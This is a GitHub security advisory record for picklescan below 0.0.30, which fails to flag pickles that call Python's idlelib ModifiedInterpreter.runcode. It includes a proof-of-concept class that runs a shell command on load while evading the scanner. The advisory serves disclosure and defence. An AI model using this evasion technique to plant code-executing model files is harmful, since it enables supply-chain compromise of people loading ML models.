advisory_id: GHSA-3gf5-cxq9-w223
datasource_id: github_osv_importer_v2/GHSA-3gf5-cxq9-w223
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-3gf5-cxq9-w223/GHSA-3gf5-cxq9-w223.json
aliases: []
summary: |
  Picklescan is missing detection when calling built-in python idlelib.pyshell.ModifiedInterpreter.runcode
  ### Summary

  Using idlelib.pyshell.ModifiedInterpreter.runcode function, which is a built-in python library function to execute remote pickle file.

  ### Details

  The attack payload executes in the following steps:

  First, the attacker craft the payload by calling to idlelib.pyshell.ModifiedInterpreter.runcode function in reduce method
  Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.

  ### PoC

  ```

  from idlelib.pyshell import ModifiedInterpreter
  from types import SimpleNamespace

  class EvilIdlelibPyshellModifiedInterpreterRuncode:
      def __reduce__(self):
          payload = "__import__('os').system('whoami')"
          fake_self = SimpleNamespace(
              locals={},
              tkconsole=SimpleNamespace(
                  executing=False,
                  beginexecuting=str,
                  canceled=False,
                  closing=False,
                  showtraceback=str,
                  endexecuting=str,
                  stderr=None,
                  text=SimpleNamespace(),
                  getvar=str
              ),
              rpcclt=None,
              debugger=None,
              checklinecache=str,
              active_seq=None,
              showtraceback=str,
              canceled=False,
              closing=False
          )
          return ModifiedInterpreter.runcode, (fake_self, payload)

  ```

  ### Impact

  Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
  What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
  Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.

  ### Corresponding

  https://github.com/FredericDT
  https://github.com/Qhaoduoyu
impacted_packages:
  - purl: pkg:pypi/picklescan
    affected_versions: vers:pypi/<0.0.30
    fixed_versions: vers:pypi/0.0.30
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/commit/1931c2d04eaca8d20597705ff39cab78ba364e4b
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-3gf5-cxq9-w223
    reference_type:
    reference_id:
